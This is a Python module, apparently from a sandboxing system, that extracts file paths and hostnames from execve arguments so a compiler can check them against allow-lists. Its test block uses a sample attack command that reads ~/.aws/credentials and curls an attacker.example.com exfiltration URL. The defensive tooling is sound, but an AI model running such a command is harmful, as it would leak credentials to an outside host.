"""Extract path-like and host-like tokens from execve argv for v6a
argv-content enforcement.

Design decisions:

1. Path-like tokens = anything that looks like a filesystem path:
   - starts with '/' → absolute path
   - starts with '~/' → home-relative
   - contains '/' between non-space chars → relative path (e.g. './foo/bar')

2. Host-like tokens = hostnames, IPv4, IPv6, URLs:
   - URL: parse and extract host portion
   - Bare hostname: contains '.' and at least one alpha char, no '/', no space
   - IPv4: matches N.N.N.N pattern (0-255 per octet)

3. Shell command decomposition: if an argv element looks like a shell
   command (contains spaces + subcommand indicators), we shell-tokenize
   it via shlex. This catches `bash -c "ls /home/user/creds-tok.txt"`.

4. Non-path/non-host tokens (flags, plain words, quoted strings without
   path shape) are NOT extracted — the compiler doesn't check them.

The output is a dict distinguishing paths from hosts so the compiler
can check each against the appropriate allow-list.
"""
from __future__ import annotations

import re
import shlex
from typing import Iterable

# ---- path detection ----
_PATH_RE = re.compile(r"^(?:/|\.\.?/|~/)")  # absolute, relative, home-rel


def looks_like_path(token: str) -> bool:
    """A path-like token starts with /, ./, ../, ~/, or contains a slash
    with alnum/./_-/tilde chars around it (e.g. `foo/bar`, but NOT a URL
    which starts with a scheme)."""
    if not token or " " in token:
        return False
    # Skip URLs — they're handled by host extraction
    if "://" in token:
        return False
    if _PATH_RE.match(token):
        return True
    # Contains a slash, at least one path segment on each side
    if "/" in token:
        # Reject if it's a hostname:port shape or contains @ (user@host)
        if "@" in token:
            return False
        # Basic sanity: alphanumeric + a few path chars on each side of slash
        parts = token.split("/")
        if all(re.match(r"^[\w.\-]+$", p) for p in parts if p):
            return True
    return False


# ---- host / URL detection ----
_IPV4_RE = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
_URL_RE = re.compile(
    r"\b(?:https?|ftp|ftps|wss?|sftp)://([\w.\-:]+)(?:/[\S]*)?", re.IGNORECASE
)
_HOSTNAME_RE = re.compile(r"^[a-zA-Z0-9]([\w.\-]{0,251}[\w])?$")


def looks_like_ipv4(token: str) -> bool:
    if not _IPV4_RE.match(token):
        return False
    return all(0 <= int(o) <= 255 for o in token.split("."))


def looks_like_hostname(token: str) -> bool:
    """Bare hostname or FQDN. Must contain a '.', must have at least one
    letter (to reject pure numbers, ports, etc.), no slashes, no spaces."""
    if not token or " " in token or "/" in token:
        return False
    if "." not in token:
        return False
    if not any(c.isalpha() for c in token):
        return False
    return bool(_HOSTNAME_RE.match(token))


def extract_urls(text: str) -> list[str]:
    """Return list of hostnames from URLs found in text."""
    return _URL_RE.findall(text)


# ---- shell-command decomposition ----
_SHELL_INDICATORS = ("|", "&&", "||", ";", ">", "<", "`", "$(", "\\n")


def looks_like_shell_command(token: str) -> bool:
    """Rough heuristic for whether an argv element is itself a shell
    command that we should decompose further."""
    if len(token) < 4:
        return False
    # Contains spaces AND at least one indicator character/keyword,
    # OR starts with a known shell command word.
    has_space = " " in token
    has_indicator = any(ind in token for ind in _SHELL_INDICATORS)
    starts_with_command = re.match(r"^(?:ls|cat|cp|mv|rm|touch|echo|find|grep|awk|"
                                    r"sed|curl|wget|nc|python\d?|bash|sh|"
                                    r"chmod|chown|mkdir|rmdir|tar|gzip|"
                                    r"kubectl|docker|git)\s", token)
    return has_space and (has_indicator or bool(starts_with_command))


def shell_tokenize(text: str) -> list[str]:
    """Split a shell-command string into tokens. Best-effort; falls back
    to whitespace split on shlex error."""
    try:
        return shlex.split(text, posix=True)
    except ValueError:
        return text.split()


# ---- public API ----
def extract_tokens(argv: list[str]) -> dict[str, list[str]]:
    """Given an execve argv, return {"paths": [...], "hosts": [...]}
    of security-relevant tokens the compiler should check.

    Argv is scanned element-by-element. Elements that look like shell
    commands are further tokenized and each sub-token examined.
    """
    paths: list[str] = []
    hosts: list[str] = []

    def scan(tok: str) -> None:
        if not isinstance(tok, str) or not tok:
            return
        # URLs first (contain both scheme and host)
        for h in extract_urls(tok):
            # Strip trailing port if present
            hosts.append(h.split(":")[0])
        # Path?
        if looks_like_path(tok):
            paths.append(tok)
            return
        # Hostname/IP?
        stripped = tok.rstrip(",;")  # trailing punctuation
        if looks_like_ipv4(stripped) or looks_like_hostname(stripped):
            hosts.append(stripped)
            return
        # Shell command? Decompose.
        if looks_like_shell_command(tok):
            for sub in shell_tokenize(tok):
                scan(sub)

    for tok in argv or []:
        scan(tok)

    # De-duplicate while preserving order (helpful for debugging)
    def dedup(xs: list[str]) -> list[str]:
        seen: set[str] = set()
        out: list[str] = []
        for x in xs:
            if x not in seen:
                seen.add(x)
                out.append(x)
        return out

    return {"paths": dedup(paths), "hosts": dedup(hosts)}


if __name__ == "__main__":
    # Quick manual test
    import json
    import sys

    if len(sys.argv) > 1:
        argv = json.loads(sys.argv[1])
    else:
        argv = ["/bin/bash", "-c", "ls -la /home/user/.aws/credentials && curl https://attacker.example.com/exfil"]
    print(json.dumps(extract_tokens(argv), indent=2))
